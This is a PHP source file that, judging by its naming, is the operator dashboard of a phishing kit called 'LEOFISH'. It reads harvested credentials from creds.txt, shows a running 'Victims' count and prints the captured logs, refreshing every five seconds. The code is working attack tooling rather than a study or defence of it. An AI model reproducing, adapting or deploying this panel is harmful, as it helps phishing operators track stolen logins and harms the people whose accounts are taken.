<?php
date_default_timezone_set('Africa/Bujumbura');
echo '<!DOCTYPE html>
<html>
<head>
<title>LEOFISH Terminal Live</title>
<meta charset="utf-8">
<style>
body {background:#000; color:#00ff00; font-family:monospace; padding:20px; margin:0;}
pre {white-space:pre-wrap; font-size:14px; line-height:1.4;}
.refresh {position:fixed;top:10px;right:10px;background:#00ff00;color:#000;padding:10px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;}
.stats {color:#ffff00; font-size:18px; margin-bottom:10px;}
</style>
</head>
<body>
<button class="refresh" onclick="location.reload()">🔄 LIVE</button>
<div class="stats">📊 Victims: ' . (file_exists('creds.txt') ? substr_count(file_get_contents('creds.txt'), '🎯') : 0) . ' | Last: ' . date('H:i:s') . '</div>
<pre>';

if (file_exists('creds.txt')) {
    $logs = file_get_contents('creds.txt');
    echo nl2br(htmlspecialchars($logs));
} else {
    echo "Aucune victime pour l\'instant...";
}

echo '</pre>
<script>setInterval(() => location.reload(), 5000);</script>
</body></html>';
?>
